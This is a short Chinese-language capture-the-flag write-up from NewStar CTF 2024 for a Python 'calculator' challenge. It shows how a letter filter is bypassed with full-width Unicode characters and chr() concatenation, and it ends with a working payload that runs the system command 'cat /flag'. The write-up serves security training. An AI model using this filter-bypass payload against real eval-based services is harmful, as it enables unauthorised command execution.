---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
# 臭皮的计算器

F12看源码发现一串Unicode编码的字符，

![F12看源码](/assets/images/wp/2024/week3/jisuanqi_1.png)

根据提示进入/calc路由，发现是一个计算器，F12有源码：

![计算器F12的源码](/assets/images/wp/2024/week3/jisuanqi_2.png)

审计发现过滤了所有字母，结合之前看到的，得知unicode编码（全角英文）＋chr()字符拼接绕过

> 当然八进制也可以绕过

这里根据源码可知是模拟了一个python命令执行的环境，所以可有先去了解一下python是怎么执行系统命令的。

注意用bp发送的时候，+号要变成%2b，否则会被当做空格处理

```python
_＿ｉｍｐｏｒｔ_＿(ｃｈｒ(111)+ｃｈｒ(115)).ｓｙｓｔｅｍ(ｃｈｒ(99)+ｃｈｒ(97)+ｃｈｒ(116)+ｃｈｒ(32)+ｃｈｒ(47)+ｃｈｒ(102)+ｃｈｒ(108)+ｃｈｒ(97)+ｃｈｒ(103))
```
